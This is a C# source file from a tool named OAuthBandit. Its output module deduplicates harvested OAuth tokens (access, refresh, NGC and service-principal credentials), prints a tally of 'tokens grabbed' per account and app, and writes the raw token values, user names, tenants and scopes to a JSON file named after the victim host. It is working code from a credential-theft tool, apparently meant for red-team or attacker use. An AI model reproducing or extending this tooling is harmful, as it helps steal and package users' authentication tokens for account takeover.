using System.Text.Json;

namespace OAuthBandit.Core;

public class OutputManager
{
    private readonly string _hostname;
    private readonly string _username;

    public OutputManager(string hostname, string username)
    {
        _hostname = hostname;
        _username = username;
    }

    public List<Token> Deduplicate(List<Token> tokens)
    {
        var groups = new Dictionary<string, List<Token>>();

        foreach (var token in tokens)
        {
            var audienceKey = token.IsGraphToken ? "graph" : "other";
            var key = $"{token.Upn ?? "unknown"}|{token.Application}|{token.TokenType}|{audienceKey}";
            if (!groups.ContainsKey(key)) groups[key] = new();
            groups[key].Add(token);
        }

        return groups.Values
            .Select(g => g.OrderByDescending(t => t.ExpiresAt ?? "0000-00-00").First())
            .ToList();
    }

    public void PrintStatistics(List<Token> tokens)
    {
        var rt = tokens.Count(t => t.TokenType == "refresh_token");
        var at = tokens.Count(t => t.TokenType == "access_token");
        var ngc = tokens.Count(t => t.TokenType == "ngc_token");
        var users = tokens.Where(t => t.Upn != null).Select(t => t.Upn!).Distinct().ToList();
        var apps = tokens.GroupBy(t => t.Application).OrderByDescending(g => g.Count());

        Console.WriteLine();
        var sp = tokens.Count(t => t.TokenType == "sp_credential" || t.TokenType == "sp_certificate");
        var parts = new List<string> { $"{at} access", $"{rt} refresh" };
        if (ngc > 0) parts.Add($"{ngc} ngc");
        if (sp > 0) parts.Add($"{sp} service principal");
        Console.WriteLine($"  ~ {tokens.Count} tokens grabbed ({string.Join(", ", parts)})");
        Console.WriteLine($"  ~ {users.Count} account(s): {string.Join(", ", users.Take(5))}{(users.Count > 5 ? " ..." : "")}");
        Console.WriteLine($"  ~ apps: {string.Join(" | ", apps.Select(g => $"{g.Key} x{g.Count()}"))}");
        Console.WriteLine();
    }

    // export everything to json - flat structure, one entry per token
    public string Export(List<Token> tokens, string outputDir = ".")
    {
        tokens = Deduplicate(tokens);

        var users = tokens.Where(t => t.Upn != null).Select(t => t.Upn!).Distinct().ToList();

        // flat list - each token is its own entry
        var entries = tokens.Select(t => new Dictionary<string, object?>
        {
            ["user"] = t.Upn ?? "unknown",
            ["app"] = t.Application,
            ["kind"] = t.TokenType,
            ["client"] = t.ClientId,
            ["tenant"] = t.TenantId,
            ["scope"] = t.Scope,
            ["audience"] = t.Audience,
            ["token"] = t.TokenValue,
            ["prt_bound"] = t.IsPrtBound,
            ["expires"] = t.ExpiresAt,
            ["src"] = t.SourceFile
        }).ToList();

        var output = new Dictionary<string, object?>
        {
            ["tool"] = "OAuthBandit",
            ["v"] = "2.0",
            ["ts"] = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"),
            ["host"] = _hostname,
            ["run_as"] = _username,
            ["total"] = tokens.Count,
            ["users"] = users,
            ["tokens"] = entries
        };

        var exportDir = Path.Combine(outputDir, "export");
        Directory.CreateDirectory(exportDir);
        var ts = DateTime.Now.ToString("yyyyMMdd_HHmmss");
        var filename = Path.Combine(exportDir, $"grab_{_hostname}_{ts}.json");

        File.WriteAllText(filename, JsonSerializer.Serialize(output, new JsonSerializerOptions { WriteIndented = true }));
        Console.WriteLine($"  ~ saved: {filename}");
        return filename;
    }
}
